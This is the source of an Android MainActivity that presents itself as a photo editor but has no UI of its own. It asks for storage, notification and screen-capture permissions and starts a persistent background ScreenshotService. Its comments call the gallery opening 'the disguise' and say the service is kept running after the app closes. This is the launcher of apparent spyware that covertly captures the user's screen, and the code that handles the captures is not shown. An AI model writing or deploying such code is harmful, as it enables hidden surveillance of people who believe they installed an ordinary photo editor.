package com.demo.photoeditor;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {
    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1000;
    private static final int REQUEST_CODE_PERMISSIONS = 2000;
    private static final int REQUEST_CODE_OPEN_GALLERY = 3000;
    private Intent mediaProjectionIntent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // NO UI - Immediately open gallery
        Log.d("MainActivity", "onCreate -> checkPermissionsAndStart");
        // Defer past onResume to avoid the Android 7.x translucent-activity crash
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                checkPermissionsAndStart();
            }
        });
    }

    private void checkPermissionsAndStart() {
        Log.d("MainActivity", "checkPermissionsAndStart (SDK=" + Build.VERSION.SDK_INT + ")");
        // Check storage permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions = new String[]{
                    Manifest.permission.POST_NOTIFICATIONS,
                    Manifest.permission.READ_MEDIA_IMAGES
                };
            } else {
                permissions = new String[]{
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                };
            }

            boolean allGranted = true;
            for (String permission : permissions) {
                if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (!allGranted) {
                ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE_PERMISSIONS);
                return;
            }
        }

        // Start the service in background
        startBackgroundService();
    }

    private void startBackgroundService() {
        // Request screen capture permission in background
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            MediaProjectionManager projectionManager =
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            Intent intent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(intent, REQUEST_CODE_SCREEN_CAPTURE);
        }
    }

    private void openGallery() {
        // Open the real gallery app
        Intent galleryIntent = new Intent(Intent.ACTION_VIEW);
        galleryIntent.setType("image/*");

        // Try to open Google Photos or default gallery
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            galleryIntent.setAction(MediaStore.ACTION_PICK_IMAGES);
        }

        startActivityForResult(Intent.createChooser(galleryIntent, "Select Photo"),
            REQUEST_CODE_OPEN_GALLERY);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            Log.d("MainActivity", "onActivityResult SCREEN_CAPTURE resultCode=" + resultCode + " data=" + (data != null));
            if (resultCode == RESULT_OK) {
                mediaProjectionIntent = data;
                startScreenshotService();
                // Open the gallery after screen capture is granted (the disguise)
                openGallery();
            } else {
                // If user denies, try again in background
                Toast.makeText(this, "Photo Editor needs permission to work", Toast.LENGTH_SHORT).show();
                finish();
            }
        } else if (requestCode == REQUEST_CODE_OPEN_GALLERY) {
            Log.d("MainActivity", "onActivityResult OPEN_GALLERY resultCode=" + resultCode);
            // User was looking at gallery - we stay in background
            // Keep the service running
        }
    }

    private void startScreenshotService() {
        Log.d("MainActivity", "startScreenshotService mediaProjectionIntent=" + (mediaProjectionIntent != null));
        if (mediaProjectionIntent != null) {
            Intent serviceIntent = new Intent(this, ScreenshotService.class);
            serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, RESULT_OK);
            serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, mediaProjectionIntent);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                startBackgroundService();
                openGallery();
            } else {
                Toast.makeText(this, "Permissions required for photo editing", Toast.LENGTH_LONG).show();
                finish();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Don't stop service - keep it running in background
    }
}
